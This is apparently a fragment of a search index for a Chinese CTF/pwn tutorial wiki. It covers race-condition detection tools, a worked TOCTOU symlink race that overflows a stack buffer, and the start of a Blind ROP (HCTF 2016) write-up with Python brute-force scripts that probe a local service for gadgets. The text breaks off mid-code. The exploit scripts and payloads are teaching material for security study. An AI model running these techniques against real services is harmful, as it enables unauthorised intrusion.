            "text": "\u90a3\u4e48\uff0c\u8bf4\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u68c0\u6d4b\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u5462\uff1f\u76ee\u524d\u4e5f\u786e\u5b9e\u6709\u8fd9\u65b9\u9762\u7684\u7814\u7a76\uff0c\u4e5f\u662f\u4e3b\u8981\u4ece\u9759\u6001\u5206\u6790\u548c\u52a8\u6001\u5206\u6790\u4e24\u4e2a\u65b9\u9762\u6765\u68c0\u6d4b\u3002", 
            "title": "\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_12", 
            "text": "\u76ee\u524d\u5df2\u77e5\u7684\u9759\u6001\u68c0\u6d4b\u5de5\u5177\u6709   Flawfinder  \u76ee\u6807\uff1aC/C++\u6e90\u7801  \u6b65\u9aa4  \u5efa\u7acb\u6f0f\u6d1e\u6570\u636e\u5e93  \u8fdb\u884c\u7b80\u5355\u7684\u6587\u672c\u6a21\u5f0f\u5339\u914d\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u6570\u636e\u6d41\u6216\u63a7\u5236\u6d41\u5206\u6790      ThreadSanitizer  \u76ee\u6807\uff1aC++\u548cGO  \u5b9e\u73b0\uff1aLLVM", 
            "title": "\u9759\u6001\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_13", 
            "text": "Intel Inspector  Valgrind", 
            "title": "\u52a8\u6001\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_14", 
            "text": "http://www.teraits.com/pitagoras/marcio/segapp/05.ppt  http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf  https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf  https://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html  https://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf  http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html  http://www.cnblogs.com/huxiao-tee/p/4660352.html  https://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/pwn/race-condition/problem/", 
            "text": "\u9898\u76ee\n\n\n\u6784\u9020\u4f8b\u5b50\n\n\n\u6e90\u4ee3\u7801\n\n\n\u6e90\u4ee3\u7801\u5982\u4e0b\n\n\n#include\n \nfcntl.h\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n#include\n \nstring.h\n\n\n#include\n \nsys/stat.h\n\n\n#include\n \nunistd.h\n\n\nvoid\n \nshowflag\n()\n \n{\n \nsystem\n(\ncat flag\n);\n \n}\n\n\nvoid\n \nvuln\n(\nchar\n \n*\nfile\n,\n \nchar\n \n*\nbuf\n)\n \n{\n\n  \nint\n \nnumber\n;\n\n  \nint\n \nindex\n \n=\n \n0\n;\n\n  \nint\n \nfd\n \n=\n \nopen\n(\nfile\n,\n \nO_RDONLY\n);\n\n  \nif\n \n(\nfd\n \n==\n \n-\n1\n)\n \n{\n\n    \nperror\n(\nopen file failed!!\n);\n\n    \nreturn\n;\n\n  \n}\n\n  \nwhile\n \n(\n1\n)\n \n{\n\n    \nnumber\n \n=\n \nread\n(\nfd\n,\n \nbuf\n \n+\n \nindex\n,\n \n128\n);\n\n    \nif\n \n(\nnumber\n \n=\n \n0\n)\n \n{\n\n      \nbreak\n;\n\n    \n}\n\n    \nindex\n \n+=\n \nnumber\n;\n\n  \n}\n\n  \nbuf\n[\nindex\n \n+\n \n1\n]\n \n=\n \n\\x00\n;\n\n\n}\n\n\nvoid\n \ncheck\n(\nchar\n \n*\nfile\n)\n \n{\n\n  \nstruct\n \nstat\n \ntmp\n;\n\n  \nif\n \n(\nstrcmp\n(\nfile\n,\n \nflag\n)\n \n==\n \n0\n)\n \n{\n\n    \nputs\n(\nfile can not be flag!!\n);\n\n    \nexit\n(\n0\n);\n\n  \n}\n\n  \nstat\n(\nfile\n,\n \ntmp\n);\n\n  \nif\n \n(\ntmp\n.\nst_size\n \n \n255\n)\n \n{\n\n    \nputs\n(\nfile size is too large!!\n);\n\n    \nexit\n(\n0\n);\n\n  \n}\n\n\n}\n\n\nint\n \nmain\n(\nint\n \nargc\n,\n \nchar\n \n*\nargv\n[\nargc\n])\n \n{\n\n  \nchar\n \nbuf\n[\n256\n];\n\n  \nif\n \n(\nargc\n \n==\n \n2\n)\n \n{\n\n    \ncheck\n(\nargv\n[\n1\n]);\n\n    \nvuln\n(\nargv\n[\n1\n],\n \nbuf\n);\n\n  \n}\n \nelse\n \n{\n\n    \nputs\n(\nUsage ./prog \nfilename\n);\n\n  \n}\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u5206\u6790\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b\n\n\n\n\n\u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u662f\u4e0d\u662f \u201cflag\u201d\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u9000\u51fa\u3002\n\n\n\u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u5927\u4e8e 255\uff0c\u662f\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u9000\u51fa\u3002\n\n\n\u5c06\u547d\u4ee4\u884c\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u6587\u4ef6\u5185\u5bb9\u8bfb\u5165\u5230 buf \u4e2d \uff0cbuf \u7684\u5927\u5c0f\u4e3a 256\u3002\n\n\n\n\n\u770b\u4f3c\u6211\u4eec\u68c0\u67e5\u4e86\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u540c\u65f6 buf \u7684\u5927\u5c0f\u4e5f\u53ef\u4ee5\u6ee1\u8db3\u5bf9\u5e94\u7684\u6700\u5927\u5927\u5c0f\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u95ee\u9898\u3002\n\n\n\u5982\u679c\u6211\u4eec\u5728\u7a0b\u5e8f\u68c0\u67e5\u5b8c\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u540e\uff0c\u5c06\u5bf9\u5e94\u7684\u6587\u4ef6\u5220\u9664\uff0c\u5e76\u7b26\u53f7\u94fe\u63a5\u5230\u53e6\u5916\u4e00\u4e2a\u66f4\u5927\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6240\u8bfb\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u66f4\u591a\uff0c\u4ece\u800c\u5c31\u4f1a\u4ea7\u751f\u6808\u6ea2\u51fa\u3002\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u90a3\u4e48\uff0c\u57fa\u672c\u601d\u8def\u6765\u4e86\uff0c\u6211\u4eec\u662f\u60f3\u8981\u83b7\u5f97\u5bf9\u5e94\u7684\nflag\n\u7684\u5185\u5bb9\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6808\u6ea2\u51fa\u4fee\u6539\u5bf9\u5e94\u7684\nmain\n\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5373\u53ef\uff0c\u901a\u8fc7\u53cd\u6c47\u7f16\u4ee5\u53ca\u8c03\u8bd5\u53ef\u4ee5\u83b7\u5f97\nshowflag\n\u7684\u5730\u5740\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684payload\n\n\n\u279c\n  \nracetest\n \ncat\n \npayload\n.\npy\n \n\nfrom\n \npwn\n \nimport\n \n*\n\n\ntest\n \n=\n \nELF\n(\n./test\n)\n\n\npayload\n \n=\n \na\n \n*\n \n0x100\n \n+\n \nb\n \n*\n \n8\n \n+\n \np64\n(\ntest\n.\nsymbols\n[\nshowflag\n])\n\n\nopen\n(\nbig\n,\n \nw\n)\n.\nwrite\n(\npayload\n)\n\n\n\n\n\n\u5bf9\u5e94\u4e24\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u811a\u672c\u4e3a\n\n\n\u279c  racetest cat exp.sh    \n\n#!/bin/sh\n\n\nfor\n i in \n`\nseq \n500\n`\n\n\ndo\n\n    cp small fake\n    sleep \n0\n.000008\n    rm fake\n    ln -s big fake\n    rm fake\n\ndone\n\n\u279c  racetest cat run.sh \n\n#!/bin/sh\n\n\nfor\n i in \n`\nseq \n1000\n`\n\n\ndo\n\n    ./test fake\n\ndone\n\n\n\n\n\n\u5176\u4e2d exp \u7528\u4e8e\u6765\u7ade\u4e89\u5728\u76f8\u5e94\u7684\u7a97\u53e3\u5185\u5220\u9664 fake \u6587\u4ef6\uff0c\u540c\u65f6\u6267\u884c\u7b26\u53f7\u94fe\u63a5\u3002run \u7528\u6765\u6267\u884c\u7a0b\u5e8f\u3002\n\n\n\u5177\u4f53\u6548\u679c\n\n\n\u279c  racetest \n(\nsh exp.sh \n)\n \n sh run.sh\n\n[\n...\n]\n\nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nflag\n{\nrace_condition_succeed!\n}\n\n\n[\n...\n]\n\n\n\n\n\n\u5176\u4e2d\u6210\u529f\u7684\u5173\u952e\u5728\u4e8e\u5bf9\u5e94\u7684 \nsleep\n \u7684\u65f6\u95f4\u9009\u62e9\u3002\n\n\n\u53c2\u8003\n\n\n\n\nhttp://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html\n\n\nhttp://www.cnblogs.com/huxiao-tee/p/4660352.html\n\n\nhttps://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_1", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_2", 
            "text": "", 
            "title": "\u6784\u9020\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_3", 
            "text": "\u6e90\u4ee3\u7801\u5982\u4e0b  #include   fcntl.h  #include   stdio.h  #include   stdlib.h  #include   string.h  #include   sys/stat.h  #include   unistd.h  void   showflag ()   {   system ( cat flag );   }  void   vuln ( char   * file ,   char   * buf )   { \n   int   number ; \n   int   index   =   0 ; \n   int   fd   =   open ( file ,   O_RDONLY ); \n   if   ( fd   ==   - 1 )   { \n     perror ( open file failed!! ); \n     return ; \n   } \n   while   ( 1 )   { \n     number   =   read ( fd ,   buf   +   index ,   128 ); \n     if   ( number   =   0 )   { \n       break ; \n     } \n     index   +=   number ; \n   } \n   buf [ index   +   1 ]   =   \\x00 ;  }  void   check ( char   * file )   { \n   struct   stat   tmp ; \n   if   ( strcmp ( file ,   flag )   ==   0 )   { \n     puts ( file can not be flag!! ); \n     exit ( 0 ); \n   } \n   stat ( file ,   tmp ); \n   if   ( tmp . st_size     255 )   { \n     puts ( file size is too large!! ); \n     exit ( 0 ); \n   }  }  int   main ( int   argc ,   char   * argv [ argc ])   { \n   char   buf [ 256 ]; \n   if   ( argc   ==   2 )   { \n     check ( argv [ 1 ]); \n     vuln ( argv [ 1 ],   buf ); \n   }   else   { \n     puts ( Usage ./prog  filename ); \n   } \n   return   0 ;  }", 
            "title": "\u6e90\u4ee3\u7801"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_4", 
            "text": "\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b   \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u662f\u4e0d\u662f \u201cflag\u201d\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u9000\u51fa\u3002  \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u5927\u4e8e 255\uff0c\u662f\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u9000\u51fa\u3002  \u5c06\u547d\u4ee4\u884c\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u6587\u4ef6\u5185\u5bb9\u8bfb\u5165\u5230 buf \u4e2d \uff0cbuf \u7684\u5927\u5c0f\u4e3a 256\u3002   \u770b\u4f3c\u6211\u4eec\u68c0\u67e5\u4e86\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u540c\u65f6 buf \u7684\u5927\u5c0f\u4e5f\u53ef\u4ee5\u6ee1\u8db3\u5bf9\u5e94\u7684\u6700\u5927\u5927\u5c0f\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u95ee\u9898\u3002  \u5982\u679c\u6211\u4eec\u5728\u7a0b\u5e8f\u68c0\u67e5\u5b8c\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u540e\uff0c\u5c06\u5bf9\u5e94\u7684\u6587\u4ef6\u5220\u9664\uff0c\u5e76\u7b26\u53f7\u94fe\u63a5\u5230\u53e6\u5916\u4e00\u4e2a\u66f4\u5927\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6240\u8bfb\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u66f4\u591a\uff0c\u4ece\u800c\u5c31\u4f1a\u4ea7\u751f\u6808\u6ea2\u51fa\u3002", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_5", 
            "text": "\u90a3\u4e48\uff0c\u57fa\u672c\u601d\u8def\u6765\u4e86\uff0c\u6211\u4eec\u662f\u60f3\u8981\u83b7\u5f97\u5bf9\u5e94\u7684 flag \u7684\u5185\u5bb9\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6808\u6ea2\u51fa\u4fee\u6539\u5bf9\u5e94\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5373\u53ef\uff0c\u901a\u8fc7\u53cd\u6c47\u7f16\u4ee5\u53ca\u8c03\u8bd5\u53ef\u4ee5\u83b7\u5f97 showflag \u7684\u5730\u5740\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684payload  \u279c    racetest   cat   payload . py   from   pwn   import   *  test   =   ELF ( ./test )  payload   =   a   *   0x100   +   b   *   8   +   p64 ( test . symbols [ showflag ])  open ( big ,   w ) . write ( payload )   \u5bf9\u5e94\u4e24\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u811a\u672c\u4e3a  \u279c  racetest cat exp.sh     #!/bin/sh  for  i in  ` seq  500 `  do \n    cp small fake\n    sleep  0 .000008\n    rm fake\n    ln -s big fake\n    rm fake done \n\u279c  racetest cat run.sh  #!/bin/sh  for  i in  ` seq  1000 `  do \n    ./test fake done   \u5176\u4e2d exp \u7528\u4e8e\u6765\u7ade\u4e89\u5728\u76f8\u5e94\u7684\u7a97\u53e3\u5185\u5220\u9664 fake \u6587\u4ef6\uff0c\u540c\u65f6\u6267\u884c\u7b26\u53f7\u94fe\u63a5\u3002run \u7528\u6765\u6267\u884c\u7a0b\u5e8f\u3002", 
            "title": "\u57fa\u672c\u601d\u8def"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_6", 
            "text": "\u279c  racetest  ( sh exp.sh  )    sh run.sh [ ... ] \nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nfile size is too large!!\nopen file failed!!: No such file or directory\nopen file failed!!: No such file or directory\nflag { race_condition_succeed! }  [ ... ]   \u5176\u4e2d\u6210\u529f\u7684\u5173\u952e\u5728\u4e8e\u5bf9\u5e94\u7684  sleep  \u7684\u65f6\u95f4\u9009\u62e9\u3002", 
            "title": "\u5177\u4f53\u6548\u679c"
        }, 
        {
            "location": "/pwn/race-condition/problem/#_7", 
            "text": "http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html  http://www.cnblogs.com/huxiao-tee/p/4660352.html  https://github.com/dirtycow/dirtycow.github.io", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/pwn/lab/6.1.1_pwn_hctf2016_brop/", 
            "text": "\u9898\u76ee\u590d\u73b0\n\n\nBROP \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790\n\n\nExploit\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u590d\u73b0\n\n\n\u51fa\u9898\u4eba\u5728 github \u4e0a\u5f00\u6e90\u4e86\u4ee3\u7801\uff0c\n\u51fa\u9898\u4eba\u5931\u8e2a\u4e86\n\u3002\u5982\u4e0b\uff1a\n\n#include\n \nstdio.h\n\n\n#include\n \nunistd.h\n\n\n#include\n \nstring.h\n\n\n\nint\n \ni\n;\n\n\nint\n \ncheck\n();\n\n\n\nint\n \nmain\n(\nvoid\n)\n \n{\n\n    \nsetbuf\n(\nstdin\n,\n \nNULL\n);\n\n    \nsetbuf\n(\nstdout\n,\n \nNULL\n);\n\n    \nsetbuf\n(\nstderr\n,\n \nNULL\n);\n\n\n    \nputs\n(\nWelCome my friend,Do you know password?\n);\n\n        \nif\n(\n!\ncheck\n())\n \n{\n\n            \nputs\n(\nDo not dump my memory\n);\n\n        \n}\n \nelse\n \n{\n\n            \nputs\n(\nNo password, no game\n);\n\n        \n}\n\n\n}\n\n\n\nint\n \ncheck\n()\n \n{\n\n    \nchar\n \nbuf\n[\n50\n];\n\n    \nread\n(\nSTDIN_FILENO\n,\n \nbuf\n,\n \n1024\n);\n\n    \nreturn\n \nstrcmp\n(\nbuf\n,\n \naslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk\n);\n\n\n}\n\n\n\n\u4f7f\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u7f16\u8bd1\uff0c\u7136\u540e\u8fd0\u884c\u8d77\u6765\uff1a\n\n$ gcc -z noexecstack -fno-stack-protector -no-pie brop.c\n\n\nchecksec \u5982\u4e0b\uff1a\n\n$ checksec -f a.out\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               2       a.out\n\n\n\u7531\u4e8e socat \u5728\u7a0b\u5e8f\u5d29\u6e83\u65f6\u4f1a\u65ad\u5f00\u8fde\u63a5\uff0c\u6211\u4eec\u5199\u4e00\u4e2a\u5c0f\u811a\u672c\uff0c\u8ba9\u7a0b\u5e8f\u5728\u5d29\u6e83\u540e\u7acb\u5373\u91cd\u542f\uff0c\u8fd9\u6837\u5c31\u6a21\u62df\u51fa\u4e86\u8fdc\u7a0b\u73af\u5883 \n127.0.0.1:10001\n\uff1a\n\n#!/bin/sh\n\n\nwhile\n true\n;\n \ndo\n\n        \nnum\n=\n`\nps -ef \n|\n grep \nsocat\n \n|\n grep -v \ngrep\n \n|\n wc -l\n`\n\n        \nif\n \n[\n \n$num\n -lt \n5\n \n]\n;\n \nthen\n\n                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out \n\n        \nfi\n\n\ndone\n\n\n\n\u5728\u4e00\u4e2a\u5355\u72ec\u7684 shell \u4e2d\u8fd0\u884c\u5b83\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u7b80\u5355\u6a21\u62df\u51fa\u4e86\u6bd4\u8d5b\u65f6\u7684\u73af\u5883\uff0c\u5373\u4ec5\u63d0\u4f9b ip \u548c\u7aef\u53e3\u3002\uff08\u4e0d\u505c\u5730\u65ad\u5f00\u91cd\u8fde\u7279\u522b\u8017CPU\uff0c\u5efa\u8bae\u5728\u670d\u52a1\u5668\u4e0a\u8dd1\uff09\n\n\nBROP \u539f\u7406\u53ca\u9898\u76ee\u89e3\u6790\n\n\nBROP \u5373 Blind ROP\uff0c\u9700\u8981\u6211\u4eec\u5728\u65e0\u6cd5\u83b7\u5f97\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7 ROP \u8fdb\u884c\u8fdc\u7a0b\u653b\u51fb\uff0c\u52ab\u6301\u8be5\u5e94\u7528\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\uff0c\u53ef\u7528\u4e8e\u5f00\u542f\u4e86 ASLR\u3001NX \u548c\u6808 canary \u7684 64-bit Linux\u3002\u8fd9\u4e00\u6982\u5ff5\u662f\u662f\u5728 2014 \u5e74\u63d0\u51fa\u7684\uff0c\u8bba\u6587\u548c\u5e7b\u706f\u7247\u5728\u53c2\u8003\u8d44\u6599\u4e2d\u3002\n\n\n\u5b9e\u73b0\u8fd9\u4e00\u653b\u51fb\u6709\u4e24\u4e2a\u5fc5\u8981\u6761\u4ef6\uff1a\n1. \u76ee\u6807\u7a0b\u5e8f\u5b58\u5728\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5e76\u4e14\u6211\u4eec\u77e5\u9053\u600e\u6837\u53bb\u89e6\u53d1\u5b83\n2. \u76ee\u6807\u8fdb\u7a0b\u5728\u5d29\u6e83\u540e\u4f1a\u7acb\u5373\u91cd\u542f\uff0c\u5e76\u4e14\u91cd\u542f\u540e\u8fdb\u7a0b\u88ab\u52a0\u8f7d\u7684\u5730\u5740\u4e0d\u53d8\uff0c\u8fd9\u6837\u5373\u4f7f\u76ee\u6807\u673a\u5668\u5f00\u542f\u4e86 ASLR \u4e5f\u6ca1\u6709\u5f71\u54cd\u3002\n\n\n\u4e0b\u9762\u6211\u4eec\u7ed3\u5408\u9898\u76ee\u6765\u8bb2\u4e00\u8bb2\u3002\n\n\n\u6808\u6ea2\u51fa\n\n\n\u9996\u5148\u662f\u8981\u627e\u5230\u6808\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u8001\u529e\u6cd5\u4ece 1 \u4e2a\u5b57\u7b26\u5f00\u59cb\uff0c\u66b4\u529b\u679a\u4e3e\uff0c\u76f4\u5230\u5b83\u5d29\u6e83\u3002\n\ndef\n \nget_buffer_size\n():\n\n    \nfor\n \ni\n \nin\n \nrange\n(\n100\n):\n\n        \npayload\n  \n=\n \nA\n\n        \npayload\n \n+=\n \nA\n*\ni\n\n        \nbuf_size\n \n=\n \nlen\n(\npayload\n)\n \n-\n \n1\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsend\n(\npayload\n)\n\n            \np\n.\nrecv\n()\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: \n%d\n \n%\n \nbuf_size\n)\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbuffer size: \n%d\n \n%\n \nbuf_size\n)\n\n            \nreturn\n \nbuf_size\n\n\n\n\n[*] buffer size: 72\n\n\n\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5d29\u6e83\u610f\u5473\u7740\u6211\u4eec\u8986\u76d6\u5230\u4e86\u8fd4\u56de\u5730\u5740\uff0c\u6240\u4ee5\u7f13\u51b2\u533a\u5e94\u8be5\u662f\u53d1\u9001\u7684\u5b57\u7b26\u6570\u51cf\u4e00\uff0c\u5373 buf(64)+ebp(8)=72\u3002\u8be5\u9898\u5e76\u6ca1\u6709\u5f00\u542f canary\uff0c\u6240\u4ee5\u8df3\u8fc7\u7206\u7834\u7684\u8fc7\u7a0b\u3002\n\n\nstop gadget\n\n\n\u5728\u5bfb\u627e\u901a\u7528 gadget \u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a stop gadget\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5f53\u6211\u4eec\u628a\u8fd4\u56de\u5730\u5740\u8986\u76d6\u540e\uff0c\u7a0b\u5e8f\u6709\u5f88\u5927\u7684\u51e0\u7387\u4f1a\u6302\u6389\uff0c\u56e0\u4e3a\u6240\u8986\u76d6\u7684\u5730\u5740\u53ef\u80fd\u5e76\u4e0d\u662f\u5408\u6cd5\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u4f7f\u7a0b\u5e8f\u6b63\u5e38\u8fd4\u56de\u7684\u5730\u5740\uff0c\u79f0\u4f5c stop gadget\uff0c\u8fd9\u4e00\u6b65\u81f3\u5173\u91cd\u8981\u3002stop gadget \u53ef\u80fd\u4e0d\u6b62\u4e00\u4e2a\uff0c\u8fd9\u91cc\u6211\u4eec\u4e4b\u95f4\u8fd4\u56de\u627e\u5230\u7684\u7b2c\u4e00\u4e2a\u597d\u4e86\uff1a\n\ndef\n \nget_stop_addr\n(\nbuf_size\n):\n\n    \naddr\n \n=\n \n0x400000\n\n    \nwhile\n \nTrue\n:\n\n        \nsleep\n(\n0.1\n)\n\n        \naddr\n \n+=\n \n1\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\naddr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nstop address: 0x\n%x\n \n%\n \naddr\n)\n\n            \nreturn\n \naddr\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n            \naddr\n \n-=\n \n1\n\n\n\n\u7531\u4e8e\u6211\u4eec\u5728\u672c\u5730\u7684\u5b88\u62a4\u811a\u672c\u7565\u7b80\u964b\uff0c\u5728\u7a0b\u5e8f\u6302\u6389\u548c\u91cd\u65b0\u542f\u52a8\u4e4b\u95f4\u5b58\u5728\u4e00\u5b9a\u7684\u65f6\u95f4\u5dee\uff0c\u6240\u4ee5\u8fd9\u91cc \nsleep(0.1)\n \u505a\u4e00\u5b9a\u7684\u7f13\u51b2\uff0c\u5982\u679c\u8fd8\u662f\u51b2\u7a81\uff0c\u5728 \nexcept\n \u8fdb\u884c\u5904\u7406\uff0c\u540e\u9762\u7684\u4ee3\u7801\u4e5f\u4e00\u6837\u3002\n\n[*] stop address: 0x4005e5\n\n\n\ncommon gadget\n\n\n\u6709\u4e86 stop gadget\uff0c\u90a3\u4e9b\u539f\u672c\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740\u8fd8\u662f\u4e00\u6837\u4f1a\u5bfc\u81f4\u5d29\u6e83\uff0c\u4f46\u90a3\u4e9b\u6b63\u5e38\u8fd4\u56de\u7684\u5730\u5740\u5219\u4f1a\u901a\u8fc7 stop gadget \u8fdb\u5165\u88ab\u6302\u8d77\u7684\u72b6\u6001\u3002\u4e0b\u9762\u6211\u4eec\u5c31\u53ef\u4ee5\u5bfb\u627e\u5176\u4ed6\u53ef\u5229\u7528\u7684 gadget\uff0c\u7531\u4e8e\u662f 64 \u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u901a\u7528 gadget\uff08\u6709\u5173\u8be5\u5185\u5bb9\u8bf7\u53c2\u89c1\u7ae0\u82824.7\uff09\uff1a\n\ndef\n \nget_gadgets_addr\n(\nbuf_size\n,\n \nstop_addr\n):\n\n    \naddr\n \n=\n \nstop_addr\n\n    \nwhile\n \nTrue\n:\n\n        \nsleep\n(\n0.1\n)\n\n        \naddr\n \n+=\n \n1\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\naddr\n)\n\n        \npayload\n \n+=\n \np64\n(\n1\n)\n \n+\n \np64\n(\n2\n)\n \n+\n \np64\n(\n3\n)\n \n+\n \np64\n(\n4\n)\n \n+\n \np64\n(\n5\n)\n \n+\n \np64\n(\n6\n)\n\n        \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nfind address: 0x\n%x\n \n%\n \naddr\n)\n\n            \ntry\n:\n    \n# check\n\n                \npayload\n  \n=\n \nA\n*\nbuf_size\n\n                \npayload\n \n+=\n \np64\n(\naddr\n)\n\n                \npayload\n \n+=\n \np64\n(\n1\n)\n \n+\n \np64\n(\n2\n)\n \n+\n \np64\n(\n3\n)\n \n+\n \np64\n(\n4\n)\n \n+\n \np64\n(\n5\n)\n \n+\n \np64\n(\n6\n)\n\n\n                \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n                \np\n.\nrecvline\n()\n\n                \np\n.\nsendline\n(\npayload\n)\n\n                \np\n.\nrecvline\n()\n\n                \np\n.\nclose\n()\n\n                \nlog\n.\ninfo\n(\nbad address: 